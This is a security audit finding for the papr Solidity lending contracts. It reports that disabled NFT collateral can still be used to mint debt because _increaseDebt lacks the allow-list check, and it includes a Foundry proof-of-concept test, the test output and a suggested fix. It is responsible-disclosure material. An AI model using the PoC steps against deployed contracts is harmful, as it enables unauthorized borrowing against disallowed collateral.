## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-02

# [Disabled NFT collateral should not be used to mint debt](https://github.com/code-423n4/2022-12-backed-findings/issues/91) 

# Lines of code

https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365
https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138


# Vulnerability details

## Impact

Disabled collateral can still be used to mint debt

## Proof of Concept

There is a access control function in PaprController.sol

```solidity
/// @inheritdoc IPaprController
function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)
	external
	override
	onlyOwner
{
```

According to IPaprController, if the collateral is disabled set to false, the user should not be allowed to mint debt using the collateral,

```solidity
/// @notice sets whether a collateral is allowed to be used to mint debt
/// @dev owner function
/// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not
function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs) external;
```

However, the code only checks if the collateral is allowed when adding collateral, 

```solidity
function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {
	if (!isAllowed[address(collateral.addr)]) {
		revert IPaprController.InvalidCollateral();
	}
```

but does not have the same check when minting debt, then user can use diabled collateral to mint debt.

```solidity
function _increaseDebt(
	address account,
	ERC721 asset,
	address mintTo,
	uint256 amount,
	ReservoirOracleUnderwriter.OracleInfo memory oracleInfo
) internal {
	uint256 cachedTarget = updateTarget();

	uint256 newDebt = _vaultInfo[account][asset].debt + amount;
	uint256 oraclePrice =
		underwritePriceForCollateral(asset, ReservoirOracleUnderwriter.PriceKind.LOWER, oracleInfo);

	uint256 max = _maxDebt(_vaultInfo[account][asset].count * oraclePrice, cachedTarget);

	if (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);

	if (newDebt >= 1 << 200) revert IPaprController.DebtAmountExceedsUint200();

	_vaultInfo[account][asset].debt = uint200(newDebt);
	PaprToken(address(papr)).mint(mintTo, amount);

	emit IncreaseDebt(account, asset, amount);
}
```

As shown in the coded POC

We can add the following test to increaseDebt.t.sol

https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32

```solidity
function testIncreaseDebt_POC() public {

	uint256 debt = 10 ether;
	// console.log(debt);

	vm.assume(debt < type(uint200).max);
	vm.assume(debt < type(uint256).max / controller.maxLTV() / 2);

	oraclePrice = debt * 2;
	oracleInfo = _getOracleInfoForCollateral(nft, underlying);


	vm.startPrank(borrower);
	nft.approve(address(controller), collateralId);
	IPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);
	c[0] = collateral;

	controller.addCollateral(c);

	// disable the collateral but still able to mint debt
	IPaprController.CollateralAllowedConfig[] memory args = new IPaprController.CollateralAllowedConfig[](1);
	args[0] = IPaprController.CollateralAllowedConfig({
		collateral: address(collateral.addr),
		allowed: false
	});

	vm.stopPrank();

	vm.prank(controller.owner());
	controller.setAllowedCollateral(args);

	vm.startPrank(borrower);

	controller.increaseDebt(borrower, collateral.addr, debt, oracleInfo);
	assertEq(debtToken.balanceOf(borrower), debt);
	assertEq(debt, controller.vaultInfo(borrower, collateral.addr).debt);
}
```

We disable the collateral but still able to mint debt by calling increaseDebt

We run the test 

```solidity
forge test -vvv --match testIncreaseDebt_POC
```

The test pass, but the test should revert.

```
Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest
[PASS] testIncreaseDebt_POC() (gas: 239301)
Test result: ok. 1 passed; 0 failed; finished in 237.42ms
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

We recommend the project add check to make sure when the collateral is disabled, the collateral should not be used to mint debt

```solidity
if (!isAllowed[address(collateral.addr)]) {
	revert IPaprController.InvalidCollateral();
}
```